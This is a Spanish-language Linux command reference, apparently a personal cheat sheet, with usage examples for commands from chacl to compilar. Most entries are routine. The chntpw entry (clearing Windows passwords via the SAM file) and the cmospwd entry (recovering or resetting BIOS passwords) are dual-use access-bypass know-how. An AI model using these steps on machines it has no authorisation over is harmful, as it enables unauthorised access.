$ chacl d:u:user:rw directorio/ (establece una ACL por defecto para el usuario "user" en directorio/. Esta ACL se aplicará automáticamente a cualquier archivo nuevo que se cree dentro de ese directorio)


chafa
Visor de imágenes en ascii
$ chafa -C on -c full imagen.png (centrada y el máxino de color)
$ chafa -c 240 -s 50 imagen.png (a 240 colores y estableciendo mdedia de columnas y filas a 50)
$ chafa imagen.gif


chage
Establece/visualiza el número de días para cambio de contraseña
$ chage -l usuario   (muestras datos sobre la contraseña)
$ chage -M max_días -W aviso usuario
$ chage -d 0 usuario (en la siguiente entrada al sistema pedirá al usuario cambiar la contraseña)
-l: lista los parámetros actuales de la cuenta del usuario.
-m días: mínimo de días a transcurrir para que pueda cambiar la contraseña
-M días: máximo de días a partir del último cambio de cambio de la contraseña
-W: Días de antelación que se ha de avisar de que su contraseña va a caducar.
-I: Días que transcurren desde que caduca la contraseña del usuario hasta que la cuenta queda bloqueada. Si el valor es 0, la cuenta no está bloqueada después de que caduque la contraseña
-d días: Número de días desde Enero 1 de 1970 que la contraseña fué cambiada.
-E días: especifica fecha del bloqueo de la cuenta (formato YYYY-MM-DD)


chalow
Convierte los archivos changelog a páginas html para visualizar con el navegador.
$ chalow -d /home/pep/dades/arxius_importants/dotemacs.d/.emacs.d/elpa/muse-3.20.2/ChangeLog


changetrack
Muestra los cambios que se producen en un conjunto de archivos especificado. Está diseñado para ejecutarse como un trabajo cron. Descomentar los directorios que queremos monitorizar si se produce algun cambio en:
# nano /etc/changetrack.conf
O editar el archivo ~/.changetrackrc y colocar la ruta absoluta de cada archivo a monitorear o por ejemplo, todo el directorio personal $HOME/*. Pueden ponerse comentarios com "#".
# changetrack (lanzar la aplicación)
# ls .changetrack (visualizar los archivos modificados)


chardet
Detector de codificación.
$ chardet archivo


chattr
[ver lsattr]. Cambia los atributos de ficheros (bloquea el fichero).
# chattr +i /etc/resolv.conf (impedirá modificaciones por  procesos o por root)
# chattr -i /etc/resolv.conf    (lo desbloquea)
# chattr -V -R +i /home/usuario/directorio (bloqueo recursivo y mostrando toda la información)
# chattr +a  archivo (desactiva el acceso al fichero excepto para añadir datos)


chdir
Cambiar a otro directorio como el comando cd [ver].
$ chdir /var/www/html


cheat
[python-pip git] Muestra chuletas de algunos comandos. Permite construir nuestras propias chuletas colocandolas en el directorio que muestra la opcion -d. Descarga e instalacion:
	# pip install docopt pygments
	$ git clone https://github.com/chrisallenlane/cheat.git
	$ cd cheat
	# python setup.py install
	$ wget https://github.com/chrisallenlane/cheat/raw/master/cheat/autocompletion/cheat.bash
	# cp cheat.bash /etc/bash_completion.d/
$ cheat -l (Listado de los comandos)
$ cheat ifconfig (Muestra la chuleta de ifconfig)
$ cheat -d (Muestra el directorio de las chuletas)
$ cheat -e ifconfig (Pregunta si queremos crear una copia de la chuleta ifconfig en nuestro $HOME para modificarla. Tendra prioridad sobre la del sistema)
1-
Con python-pip instalado tambien podemos instalarla con:
# pip install cheat


checkbashisms
Realiza comprobaciones básicas en scripts de shell /bin/sh por la posible presencia de bashisms. La definición de bashism equivale a "una función de shell que no se requiere que sea soportada por POSIX "; esto significa que algunos problemas marcados pueden ser permitidos bajo secciones opcionales de POSIX. En los casos en que POSIX y Debian Policy no coincidan, los checkbashisms, de forma predeterminada, permiten extensiones permitidas por Policy pero también pueden proporcionar opciones para una verificación más estricta.
$ checkbashims script.sh


check-bios-nx
Determinar si la BIOS ha bloqueado las capacidades NX de la CPU.
$ check-bios-nx –verbose
ok: the NX bit is operational on this CPU.


checkbot
Verifica enlaces internos o externos de una url.
$ checkbot http://google.com (básico)
$ checkbot --mailto usuario@correo.org http://google.com (enciar correo cuando termine el escaneo)


check-enhancements
[debian-goodies]. Muestra paquetes con versiones mejoradas. És un proceso lento.
# check-enhancemets -ip


check_forensic
Comprueba en el registro de las solicitudes a apache las que no se completaron correctamente y genera un registro de solicitudes para cada una.
# check_forensic /var/log/apache2/access.log


checkgid
Programa que verifica si el usuario se puede establecer en el grupo de apache2. Esto es para ver si es un grupo válido para que apache2 lo use en tiempo de ejecución. Ha de ejecutarse como superusuario.
# checkgid (si no devuelve nada es correcto)
# checkgid user (si no devuelve nada, user está en el grupo y puede configurarlo)


checkint
[netdiag]. Muestra todas las interfaces de red activas
$ checking


check-language-support
Listado de paquetes de idiomas instalados en el sistema.
$ check-language-support -l es
$ check-language-support -a (todos)


checklink
[w3c-linkchecker]. Programa que lee un documento HTML o XHTML, extrae una lista de urls y enlaces y comprueba que ninguno esté definido dos veces y que todos los enlaces sean correctos.
$ checklink -b archivo.html (mostrar sólo los enlaces rotos, no las redirecciones)
$ checklink -s archivo.html (mostrar sólo el resumen de resultados)


checklistlinux
Herramienta para auditar la seguridad del sistema, verificando configuraciones, variables y consejos con las mejores practicas de seguridad.
$ checklistlinux (al acabar la auditoria muestra el nombre de los .html donde se han guardar lo resultados)


checkrestart
[debian-goodies]. Muestra procesos activos que están utilizando una versión anterior de algún fichero que haya sido actualizado. A veces una actualización trae nuevas bibliotecas del sistema y los procesos que se esten ejecutando siguen utilizando las versiones anteriores de estas bibliotecas. En sistemas Debian GNU/Linux estables, generalmente se necesita para eliminar un exposición del sistema a una vulnerabilidad que podría haberse solucionado actualizando una biblioteca que utiliza algún proceso. Tambien se usa para encontrar versiones desactualizadas de bibliotecas en uso.
# checkrestart -a (muestra todos)
# checkrestart -p chromium (referente a un paquete)
# checkrestart -i 1912 (referente a un PID)
Nota.- Aunque la salida muestre gran cantidad de paquetes [por ejemplo por tener una "testing" o por una actualización del navegador mientras este está activo] no es preciso reiniciar el sistema o la aplicación pero es aconsejable.


checksec
script diseñado para probar qué características estándar de seguridad del sistema operativo Linux y PaX se están utilizando.
# checksec -k (del kernel)
# checksec -fp 1 (comprueba el proceso con PID 1)
# checksec -o xml -pa (de todos los procesos y la salida como .xml)


checksecurity
Realiza comprobaciones de seguridad muy básicas del sistema tales como: sistemas de archivos remotos montados de forma insegura, cambios en los programas setuid, cambios en los puertos abiertos para detectar programas maliciosos, cuentas del sistema vacías o duplicadas, sistemas de archivos montados cercanos a su capacidad, registros generados por iptables con intentos de intrusión... Los informes se guardan en /var/log/setuid/setuid.changes. Si se desea que la información se envie a root, descomentar la linea #CHECKSECURITY_EMAIL="root" en el archivo de configuración /etc/checksecurity.conf
# checksecurity


check-support-status
[debian-security-support]. Comprueba los paquetes instalados si tienen soporte de seguridad. Según Debian: Desafortunadamente, ha sido necesario limitar el soporte de seguridad para algunos
paquetes.
$ check-support-status (Muestra los que no tienen soporte de seguridad)


checkupdates
Utilidad que se utiliza para comprobar si hay actualizaciones de paquetes disponibles en el administrador de paquetes del sistema. Es parte del administrador de paquetes pacman en Arch Linux y sus derivados.
# checkupdates (Lista de actualizaciones pendientes)
# checkupdates --download (Enumerar las actualizaciones pendientes y descargar los paquetes al caché de pacman)


cherokee
Servidor web
# cherokee-admin -b (iniciar el gestor. En el navegador: localhost:9090)
# cherokee-admin -b -u (No pida la contraseña)
# cherokee-admin -b -p 9091 (especificar un puerto para la gestión)


chflags
Cambiar flags de un archivo o carpeta.
$ chflags -R nouchg DIR (de forma recursiva y que el archivo se puede cambiar)
$ chflags -r uchg file (recursiva y que el archivo no se puede cambiar)
$ chflags -R -L DIR (recursiva y siguiendo enlaces simbolicos)


chfn
modifica la información personal del usuario [nombre, domicilio, teléfono….]
$ chfn usuario (permite modificar todos los datos del usuario)
Opciones
	-f nombre_completo
	-r domicilio
	-w teléfono_trabajo
	-h teléfono_particular
	-o otros datos


chgrp
Cambia el grupo al que pertenece un archivo.
$ chgrp grupo archivo


chkboot
Busca modificaciones no deseadas en el archivo /boot. El archivo de configuración esta en /etc/default/chkboot
# chkboot-check (imprime los cambios detectados en archivos de arranque)
# chkboot-desktopalert (notifica cambios detectados en archivos de arranque)
# chkboot -u (Marcar los cambios como válidos. La próxima ejecución no advertirá sobre las diferencias)
# chkboot (forma básica)


chkconfig
Para activar y desactivar servicios, ver su estado y runlevel
# chkconfig --list (muestra listado de todos los servicios y nivel de ejecución)
# chkconfig --list apache2 (muestra nivel de ejecución del especificado)
# chkconfig --level 35 apache2 on (Para arrancar apache2 con runlevel 3 y5)
# chkconfig --level 345 nscd off (Desactivar nscd en los runlevel 3, 4 y 5)
# chkconfig --del sshd  (Quitar un servicio del arranque)
# chkconfig smb  (Indica si el servicio está activo o inactivo)
# chkconfig --list | grep '3:on' (Mostrar los servicios que se ejecutan en el runlevel 3)
# chkconfig mysql off (Desactiva mysql)


chkdupexe
Buscar duplicados en ejecutables.
$ chkdupexe


chklastlog
[chkrootkit]. Lee las entradas en el archivo /var/log/wtmp (archivo con información sobre inicios y cierres de sesión) y comprueba cada usuario encontrado en este archivo si también hay una entrada en el archivo /var/log/lastlog. El programa se quejará de los ID de un usuario con inicios de sesión pero sin información de cierre de sesión.
# chklastlog


chkrootkit
[incluye las aplicaciones chkwtmp y chklastlog]. Buscador de rootkits infiltrados en el sistema.
# chkrootkit  (lanzar la aplicación)
# chkrootkit -l  (visualizar las opciones de escaneo)
# chkrootkit sshd tcpd  (verificar solo dos opciones)
# chkrootkit -q (sólo mostrar los archivos conflictivos)
# chkrootkit -x (puede examinar cadenas sospechosas en los programas binarios que pueden indicar un troyano)


chkservice
Systemd es un daemon del sistema que permite administrar los servicios que corren en la distribución Linux y se trata de un reemplazo de init que se ha convertido en estándar. En realidad chkservice hace lo mismo que systemctl para administrar dichos servicios.
# chkservice
La información que muestra en la primera linea indica:
	[x] (unidad habilitada)
	[ ] (unidad deshabilitada)
	[s] (unidad estática)
	-m- (unidad enmascarada)
	=   (unidad que se ha detenido)
	>   (unidad funcionando)
Claves para interactuar con los servicios:
	r      (Actualizar o recargar información)
	Space  (Habilitar o deshabilitar una unidad)
	s      (Iniciar o detener una unidad)
	q      (salir)


chkwtmp
[chkrootkit]. Examina el archivo /var/log/wtmp en busca de entradas sin información y que solo contengan bytes nulos. Si se encuentran tales entradas las imprime.
# chkwtmp (Verificar alteración de logs. Si no muestra nada: bien)


chmod
Gestión de permisos de los ficheros y directorios.
$ chmod ugo+rwx -R /home/usuario/directorio  (todos los permisos a todos los usuarios sobre el directorio y subdirectorios)
$ chmod 777 -R /home/usuario/directorio (Equivalente en octal)
$ chmod a+w archivo (permiso de escritura para todos)
$ chmod 222 -R /home/usuario/directorio (Equivalente en octal)
$ chmod -w archivo (Quitar permiso de escritura a un archivo)
$ chmod +x archivo (Dar permiso de ejecución)
$ chmod 744 archivo (Lectura, escritura y ejecución para el usuario y sólo lectura para el grupo y otros)
$ chmod u=rwx,go=r archivo (Equivalente en alfabético)
$ chmod --reference=file1 file2 (Otorgar los mismos permisos de file1 a file2)
Código numérico (octal):
	1 = ejecución [x]
	2 = escritura [w]
	3 (1+2) = escritura y ejecución [xw]
	4 = lectura [r]
	5 (4+1) = lectura y ejecución [rx]
	6 (4+2) = lectura y escritura [rw]
	7 (4+2+1) = lectura, escritura y ejecución [wxr]
Código alfabético:
r (lectura), w (escritura), x (ejecución)
u (usuario), g (grupo), o (otros), a (para todos)
Nota.- Cuando un directorio está marcado como ejecutable [x] significa que se puede mirar dentro [ls] o entrar en él [cd]
1.-
Los permisos de un directorio web [/var/www/html/...] se aconseja que sean 755 para los directorios y subdirectorios y 644 para los ficheros.


chntpw
Quitar o modificar contraseñas en sistemas windows.
# cd /media/sdXX/WINDOWS/system32/config  (Entrar en el directorio)
# chntpw SAM (quitar o modificar la contraseña del administrador)
# chntpw -u USUARIO SAM  (quitar o modificar la contraseña de un usuario concreto)
Aparece un menú de 5 opciones. Borrar contraseña es la opción 1 modificarla la 2.


choose
Proporciona una manera de extraer datos de archivos de texto.
$ cat archivo.txt | choose 4 (Imprima el quinto elemento de todas las línea del texto especificado. "0" sería el primero)
$ cat /etc/passwd | choose --field-separator ':' 0 2 4 (Imprima el primer, tercer y quinto elementos de cada línea, donde los elementos están separados por ':' en lugar de espacios en blanco)
$ cat archivo.txt | choose 1:4 (imprime desde el segundo al quinto elemento de cada línea, incluido el quinto)
$ cat archivo.txt | choose :2 (Imprime desde el comienzo de cada línea hasta el tercer elemento)
$ cat archivo.txt | choose --exclusive :2 (Imprimir desde el principio de cada línea hasta el segundo elemento excluyendo a partir del tercero)
$ cat archivo.txt | choose 2: (Imprimir todos los elementos desde el tercero hasta el final de cada línea)
$ cat archivo.txt | choose -1 (Imprima el último elemento de cada línea)


chown
Cambio de propietario de un archivo o directorio.
# chown usuario archivo
# chown -R usuario directorio (afecta al directorio y todos los subdirectorios)
# chown -R usuario:grupo directorio
# chown --reference=file1 file2 (Mismo propietario y grupo para file2 que file1)


chpasswd
Establecer contraseñas para usuarios de un sistema
# echo "usuario:1234" | chpasswd -m (Que la guarde en /etc/shadow en formato md5)
# chpasswd   (Esperará la introducción de datos que consistiran en pares de nombre_de_usuario:contraseña, un par por línea. Con ctrl+D finaliza:
usuario1:passwd1
usuario2:passwd2


chpst
[runit]. Se utiliza para cambiar ciertos aspectos del entorno de ejecución de un proceso, como el usuario, grupo, límites de recursos, etc.
$ chpst -u www-data:www-data /usr/sbin/nginx (ejecutar nginx como un usuario y grupo especificos)
$ chpst -M 512M /usr/bin/python script.py (limitar la cantidad máxima de memoria física y virtual que un proceso)
$ chpst -u www-data -o 100 /usr/sbin/nginx (limita a Nginx a abrir un máximo de 100 archivos simultáneamente)
$ chpst -u www-data -D /var/www/ /usr/sbin/nginx (ejecuta Nginx en un entorno chroot dentro del directorio /var/www)
$ chpst -c 100 /usr/bin/python script.py (uso de CPU al 100% [que el proceso podrá usar completamente un núcleo de la CPU])


chromium
Navegador web. El perfil por defecto está en /home/usuario/.config/chromium, para crear nuevos perfiles [El inicio del parámetro son 2 guiones]:
$ mkdir /home/usuario/.config/chromium-dos
$ chromium --user-data-dir=/home/usuario/.config/chromium-dos
$ chromium --proxy-server="socks://localhost:9050" (Arrancar la aplicación a través de un proxy)
$ chromium --incognito (Arrancar en modo privado. Para incluir por defecto este modo en las propiedades del navegador: chromium --incognito %U)
1.-
Cuando al lanzar chromium no da la salida:
       ... ERROR:process_singleton_posix.cc(358)] The profile appears to be in use by another Chromium process...
Lanzar:
$ rm ~/.config/chromium/Singleton*


chronic
[moreutils]. Mostrará el error por la salida estándar si el comando falla, tiene salida nula o se bloquea. Si el comando se ejecuta correctamente se ocultará cualquier salida.
$ chronic ls (No mostrará nada porque el comando ls se ejecuta correctamente)
$ chronic lx (Mostrará el error)
$ chronic man (Mostrará que necesita otro dato)


chrony
Sincronizar el reloj del sistema. Primero incluir los servidores en el archivo de configuración:
# nano /etc/chrony/chrony.conf
Añadir las lineas:
       pool 3.es.pool.ntp.org iburst
       pool ntp.redimadrid.es iburst
       pool europe.pool.ntp.org iburst
Reinicar el servicio y comprobar que está activo:
# systemctl restart chronyd
# systemctl status chronyd
# chronyc makestep (forzar la sincronización)
# chronyc tracking (comprobar el seguimiento)
# chronyc sources (ver una lista de las fuentes de servidores de hora)


chroot
Situarte virtualmente donde le indicas como raiz.
# chroot /media/sda3
1.-
Ejemplo de un proceso para restituir grub2 despues de una instalación de un windows:
Arrancar el live cd, abrir consola y (Asumimos que la partición que tiene el grub a instalar es la sda5:
	$ sudo su
	# mkdir /media/sda5
	# mount /dev/sda5 /media/sda5
	# mount -o bind /dev/ /media/sda5/dev/
	# mount -o bind /sys/ /media/sda5/sys/
	# mount -o bind /proc/ /media/sda5/proc/
	# chroot /media/sda5
	# update-grub
	# grub-install /dev/sda
Si precisamos conexión y esta no se realiza:
# nano /etc/resolv.conf
Y colocar:   nameserver 8.8.8.8
O en su defecto la ip del router [nameserver 192.168.1.1]


chsh
Permite cambiar la shell del usuario especificado o del sistema.
$ cat /etc/shells (Mostrar las shells disponibles en el sistema)
$ chsh -s /bin/tcsh usuario


chvt
Cambiar de consola virtual.Si, estando en la /dev/tty1, se teclea:
$ chvt 3  (Se irá a la /dev/tty3. Lo mismo que con Ctrl+Alt+F3)
$ chvt 1; sleep 10; chvt 7 (Ir a la tty1 durante 10 segundos y volver a las X)
Nota.- Si se está en una terminal en las X con el mismo comando se irá a la misma terminal /dev/tty3.


cifsiostat
[sysstat]. Muestra estadísticas sobre las operaciones de lectura y escritura en los sistemas de archivos CIFS. Podría decirse que CIFS es una versión más reciente de SMB.
# cifsiostat -m 2 3 (en megabites por segundo cada 2 segundos y 3 informes)


cjb2
Convierte formatos .PBM o .TIFF a DJVU
$ cjb2 -dpi 500 entrada.pbm salida.djvu (especificando resolución [parámetros entre 25 y 1200. Por defecto 300])


cjpeg
Convierte formatos PPM, PGM, BMP, Targa y RLE a jpeg.
$ cjpeg -grayscale -quality 60 archivo.ppm > nuevo.jpg (a escala de grises y con una calidad de 60 [ por defecto0 75])


ck-history
Listado de los logeos en el sistema [tty, pts, ssh...]
$ ck-history --frequent
$ ck-history --last-compat
$ ck-history --last | less


ck-list-sessions
Listado de sesiones abiertas en la máquina.


cksum
Suma de comprobación y número de bytes de un archivo.
$ cksum archivo


clamav
Detecta troyanos, virus, malware y otras amenazas maliciosas.
# freshclam -v (actualizar la lista de virus viendo detalles)
# freshclam -d -c 24    (arranca el demonio que actualizará clamav 24 veces diarias- Maximo 50 veces diarias)
# clamscan -ri    (Sin especificar directorio, escanear el del usuario)
# clamscan -ri --remove /home/usuario  (escanea el directorio usuario y borra directamente los archivos infectados)
# clamscan -r -l test_clamav.txt  (manda el resultado a un archivo)
# clamscan -v -r --bell --move=/home/usuario/cuarentena --log=/var/log/clamav/clamav.log /media/win
# sigtool --list-sigs > list (listado de virus y troyanos que detecta)
# clamdtop (monitorear análisis con ncurses)
# clamconf (muestra la configuración completa)
Opciones:
	-v (muestra la información)
	-r  (revisa directorios y subdirectorios)
	--bell  (aviso sonoro al detectar un virus)
	--move  (confina los virus en el directorio especificado)
	-l  (guarda los logs en el archivo especificado)
	-i  (solo mostrará los archivos infectados)
	-d  (arrancar en modo demonio)
Archivo de logs: /var/log/clamav/clamav.log
Configuración: /etc/clamav/clamd.conf
Reconfigurar paquete: # dpkg-reconfigure clamav-base
1.-
Para asegurarse de que clamav y las definiciones estén instaladas correctamente, se puede escanear el archivo de prueba EICAR [una firma inofensiva sin código de virus]:
$ curl https://secure.eicar.org/eicar.com.txt | clamscan -
La salida debe incluir:
	stdin: Win.Test.EICAR_HDB-1 FOUND


clamscan
Ver clamav


clear
Limpiar la terminal.


clear_console
[bash]. Borra la consola tty. Equivalente a C-l


clex
Administrador de archivos. Para cerrar el programa pulsar "Esc Q"
Algunas teclas de control:
	Ctrl-c (salir de cada una de las opciones siguientes)
	alt-m (menú principal)
	alt-w (Cambiar de directorio)
	alt-s (Cambiar el tipo de visualización)
	alt-/ (entrar en el directorio raiz)
	alt-~ o alt-` (Entrar en el directorio $HOME)
	ctrl-r (Actualizar panel)
	F4 (Editar archivo [vim])
	F5 (Copiar)
	F8 (Borrar)


clinfo
Imprime la información disponible sobre todas las plataformas OpenCL disponibles en el sistema y los dispositivos que exponen. Enumera todas las plataformas posibles y propiedades del dispositivo inspirado por el programa de AMD del mismo nombre e intenta generar toda la información posible
$ clinfo -l (enumerar plataformas y dispositivos por nombre, sin otras propiedades)


clitest
Busca fragmentos de texto que se parezcan a líneas de comandos interactivas de Unix y luego ejecuta esas líneas de comandos para verificar que funcionen exactamente como se muestran.
$ cat test.txt
      $ echo "linux es un sistema genial"
      linux es un sistema genial
$ clitest test.txt (el archivo indica que al ejecutar el comando echo "linux es un sistema genial", la salida esperada es linux es un sistema genial)
      #1	echo "linux es un sistema genial"
      OK: 1 of 1 test passed
Con un error en el comando "echo" [ech]:
$ cat test.txt
      $ ech "linux es un sistema genial"
      linux es un sistema genial
$ clitest test.txt
      #1	ech "linux es un sistema genial"
      ------------------------------------------------------
      [FAILED #1, line 1] ech "linux es un sistema genial"
      @@ -1 +1 @@
      -linux es un sistema genial
      +/usr/bin/clitest: 1: eval: ech: Permission denied
      ------------------------------------------------------
      FAIL: 1 of 1 test failed
Otras pruebas que se pueden realizar:
$ clitest -l test.txt (Listar sin ejecutar todas las pruebas)
$ clitest -1 test.txt (detener a la primera prueba fallida)
$ clitest -L test.txt (muestra en verde las pruebas OK y en rojo las FAIL)
$ clitest -P none test.txt (establecer indicador de prueba [test, number, dot, none])
$ clitest --color auto --post-flight 'echo "prueba realizada"' -P test test.txt (Ejecutar un comando después de ejecutar la última prueba)


clive
Descarga de videos de youtube.
$ clive http://video -O titulo (Dándole un titulo al vídeo)


cloc
Cuenta lineas de código, lineas en blanco y lineas con comentarios en varios leguajes de programación.
$ cloc script.sh
$ cloc archivo.tar.gz
$ cloc --by-file dir/ (de todos los scripts de un directorio)
$ clod --out=info.txt (guardar la salida en un fichero)


colores
Cuadro de colores. Las primeras dos cifras [0;30] afectan al color de las letras de la terminal, las segundas [0;40], una decena superior que las anteriores, corresponden al color de fondo.
	Negro          0;30	0;40
	Gris Obscuro   1;30	1;40
	Rojo           0;31	0;41
	Rojo Claro     1;31	1;41
	Verde          0;32	0;42
	Verde Claro    1;32	1;42
	Café           0;33	0;43
	Amarillo       1;33	1;43
	Azul           0;34	0;44
	Azul Claro     1;34	1;44
	Purpura        0;35	0;45
	Fucsia         1;35	1;45
	Cyan           0;36	0;46
	Cyan Claro     1;36	1;46
	Gris Claro     0;37	0;47
	Blanco         1;37	1;47
Nota.- Si se omite el el 0 o el 1 por defecto es el 0
Algunso ejemplos:
$ echo -e "\e[1;33;44mlinux es un sistema genial" (En azul toda la linea)
$ echo -e "\e[0;34mAtención:\e[1;32m linux es un\e[0;31m sistema genial" (En azul, verde y rojo sin fondo)
$ echo -e "\e[1;33;40mLinux es un sistema genial" (En amarillo y con fondo gris toda la linea)
$ echo -e "\e[1;37;1;41mLinux es un sistema genial\e[0m" (En blanco y fondo rojo hasta el final del texto  ...\e[0m")
$ echo -e "\e[33;40mAtención:\e[34;41m linux es un\e[37;42m sistema genial\e[0m" (café con fondo gris, azul y fondo rojo y blanco con fondo verde y terminando el colorido al final del texto)


cmake
Opciones de compilación de binarios. Substituto de ./configure. Se encarga de encontrar todas las dependencias necesarias y las opciones personalizadas de compilación
# cmake -L (Ver listado de opciones)
# cmake -LHA (Complementar el listado con una descripción breve y visualizar las variables privadas)


cmatrix
Salvapantallas estilo matrix
$ cmatrix -u 9 -B -C blue  (A velocidad lenta [0-9], usando todos los caracteres y especificando color [green, red, blue, white, yellow, cyan, magenta y black]
Nota.- Si durante la ejecución se pulsan las teclas siguientes, se cambia al color indicado:
! (rojo) @ (verde)# (amarillo) $ (azul) % (magenta) ^ (cyam) & (blanco) ) (negro)


cmospwd
Averiguar la contraseña de la BIOS. Arrancar con un cd-live [System rescue] y modificar la entrada del kernel del menú de opciones de grub para iniciar una shell [rw init=/bin/bash]
# cmospwd /d   (pasar la información por pantalla)
# cmospwd /k   (resetear)
# cmospwd /d /w bios.back  (copia de seguridad)
# cmospwd /l bios.back (Ver el contenido de la copia de seguridad)
# cmospwd /r bios.back  (restablecer la copia de seguridad)


cmp
Compara dos ficheros octeto a octeto.
$ cmp fichero1 fichero2


cmus
Reproductor de música.
$ cmus --plugins (Listado de plugins disponibles)
$ cmus
Algunas teclas de control:
	1 (Muestra la biblioteca)
	2 (Muestra la biblioteca ordenada según los criterios del usuario)
	4 (Muestra la cola de pistas que se reproducirá)
	5 (Navegar por los directorios)
	7 (Muestra todas las teclas de control)
	enter (reproducir la canción))
	+ (Sube el volumen un 10%)
	- (Baja el volumen un 10%)
	a (Añadir canción al listado)
	b (siguiente canción)
	c (Pausar la reproducción
	i (Estando con la opción 5, muestra los directorios ocultos)
	r (Repetir canción)
	q (salir)
Para empezar agregar la ruta al directorio de música:
	:add ~/música/
Listado de temas de colores disponibles en /usr/share/cmus. Para modificar el esquema de colores:
	:colorscheme cyan
Para que el cambio sea permanente:
$ nano .cmus/rc
Y colocar la linea:
	colorscheme cyan


cnetworkmanager
Información sobre conexiones de red
$ cnetworkmanager -d (información sobre las tarjetas de red)
$ cnetworkmanager -c (conexión activa)
$ cnetworkmanager -s (lista todas la conexiónes guardadas)
$ cnetworkmanager -u (Lista configuración de usuario de la conexión)
$ cnetworkmanager --state  (estado de la conexión)
$ cnetworkmanager -a (Lista puntos de acceso)
$ cnetworkmanager -w true/false  (activar/desactivar la conexión)


codificación
[de caracteres]. En documentos html, colocar según proceda al inicio del documento la linea:
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />


col
Normalmente este comando se utiliza para eliminar caracteres raros o no necesarios relacionados con el formato al imprimir a txt páginas man.
$ man less | col -b > less.txt


collectd
Demonio que recopila información del sistema periódicamentes. Las estadísticas se actualizan cada 10 segundos de forma predeterminada y pueden modificarse en el archivo /etc/collectd/collectd.conf. Ejemplos de configuraciónes en /usr/share/doc/collectd/examples/. Los datos recogidos se visualizan en http://localhost/server-status
# systemctl start collectd.service (pide contraseña de forma gráfica y activa el demonio)


colordiff
Muestra las diferencias entre dos ficheros de forma coloreada.
$ colordiff -y archivo1 archivo2  (en dos columnas)


colordiff-git
[apt-listdifferences]. Mismo resultado que diff con coloreado de sintaxis.
$ colordiff-git archivo1 archivo2


colored_dmesg
Como dmesg pero coloreado. El algunas distros el guión en medio [colored-dmesg]
$ colored_dmesg


colorized-logs
Colorea la salida de algunas herramientas tales como: ansi2html[ver], ansi2txt[ver], lesstty, pipetty y ttyrec2ansi
$ pipetty dmesg


colormake
Esta herramienta analiza el resultado de make para colorearlo y facilitar su lectura. Contiene dos ejecutables: colormake y clmake que se pueden invocar en lugar de make con salida coloreada [configure, clmake, clmake install].


colormgr
Ver y cambiar el perfil de color a las asignaciones de dispositivos. RGB es una escala relativa que normalmente tiene sólo 256 estados por canal.
$ colormgr get-devices display (listados de todos los dispositivos)
$ colormgr get-devices-by-kind display (del monitor. Sustituir "display" por printer, scanner, webcam...)


colortest
Incluye un conjunto de utilidades para ayudar a probar cuántos colores puede mostrar un terminal. Estas configuraciones de color dependen de la variable de entorno $TERM y de la entrada termcap
$ colortest-8
$ colortest-256
$ colortest-16


colortest-python
El programa detecta automáticamente las capacidades de color y muestra las tablas de colores apropiadas. La aplicación es similar a colortest.
$ colortest-python -b
$ colortest-python -l (con el código RGB)
$ colortest-python -n (con los números de escape [del 0 al 256])
$ colortest-python -x (con el número exadecimal)


colrm
Corta columnas de un texto.
$ cat /etc/passwd | colrm 10 (Corta desde el caracter número 10 al final de la linea)
$ cat /etc/passwd | colrm 10 50 (Borra los caracteres del 10 al 50. Sólo deja los 10 primeros y los del 50 al final)


column
Muestra los resultados ordenados por clumnas.
$ column -tns: /etc/passwd (con los dos puntos como separador)
$ mount | column -t


combine
[moreutils]. Cuatro formas de combinar dos archivos.
$ combine archivo1 and archivo2 (Las lineas que están en los dos archivos)
$ combine archivo1 not archivo2 (Las que estan en archivo1 pero no en archivo2)
$ combine archivo1 or archivo2 (Las que están en archivo1 o archivo2)
$ combine archivo1 xor archivo2 (Las que se encuentran en cualquiera de los dos pero no en ambos)


comillas
. Simples (El contenido no es interpretado por el shell. Se suele usar para indica caracteres literales)
	$ echo 'a'
	a
. Dobles (Agrupa una cadena de caracteres o string. Se suelen usar para almacenar datos en una variable)
	a="Linux es un sistema genial"
. Invertidas (Evaluan el contenido y el resultado se devuelve como variable)
	$ fecha=`date`
	echo $fecha
	dg mar 17 20:53:17 CET 2013


comm
Comparación de dos ficheros. Muestra tres columnas, en la primera están las lineas que solo estan en el primer archivo, el la segunda los que solo están en el segundo y la tercera los comunes.
$ comm archivo1 archivo2
$ comm -12 archivo 1 archivo2 (Elimina las columnas 1 y 2. Solo muestra la 3, o sea las lineas comunes


command
Cuando introducimos un comando en Bash el orden de preferencia en la búsqueda del símbolo por parte de Bash es: Primero las funciones, luego los comandos internos y por último los ficheros de scripts y ejecutables. command hace que no se busquen alias ni nombres de funciones, sólo comandos internos y comandos de fichero. Si tenemos una función llamada ls() y queremos que se ejecute el comando ls y no la función:
$ command ls


command-not-found
Activar las sugerencias sobre el paquete que puede tener un comando que erramos en la ortografía o no está instalado en el sistema y muestra la salida: "command not found":
# update-command-not-found (Recargar la base de datos)
	$ lt
	The program 'lt' is currently not installed.  To run 'lt' please ask your administrator to install the package 'looptools'
	lt: command not found


comodines
Ver “signos y comodines”


comparepdf
Comparar dos archivos pdf.
$ comparepdf archivo1.pdf archivo2.pdf


compgen
Comando para listar comandos disponibles.
$ compgen -c (Lista todos los comandos)
$ compgen -ac (lista de todos los comandos y alias)
$ compgen -a (Lista los alias)
$ compgen -b (lista los comandos internos de bash)
$ compgen -k (lista palabras reservadas)
$ compgen -A function (lista las funciones)
$ compgen -c | grep sudo (las que hacen referencia a sudo)
$ compgen -a
$ compgen -c ls
$ compgen -c rm
$ compgen -A signal


compilar
[libncurses libncurses-fdev build-essential]. Instalar aplicaciones a partir del codigo fuente . Los comandos standard que se utilizan son: ./configure, make, sudo make install y han de ejecutarse desde el directorio que contiene las fuentes. Configure y make se pueden ejecutar como usuario normal, pero make install generalmente se tiene que ejecutar como administrador por cuestión de permisos.
El script configure [configuración] sirve para comprobar las dependencias y las versiones de las librerias del paquete a instalar creando el archivo makefile que constituye la base de la compilación. Si configure falla no se creará makefile. Configure, normalmente, puede ejecutarse con algunos parametros que, en caso de existir, se especifican en el fichero INSTALL o README y que siempre acompaña al paquete de las fuentes. Tambien puede ejecutarse:
$ ./configure --help
para listar los parametros que se pueden usar. Si en el	paquete	de fuentes a intalar ya existe un archivo makefile no habrá el configure y consecuentemente si se lanza ./configure dará error [No existe el fichero ó directorio] en estos casos puede pasarse directamente al make. Algunas opciones para	configure:
      $ ./configure --prefix=/usr  (donde inslalar el programa)
      $ ./configure --syscinfdir=/etc  (donde colocar los archivos de configuración)
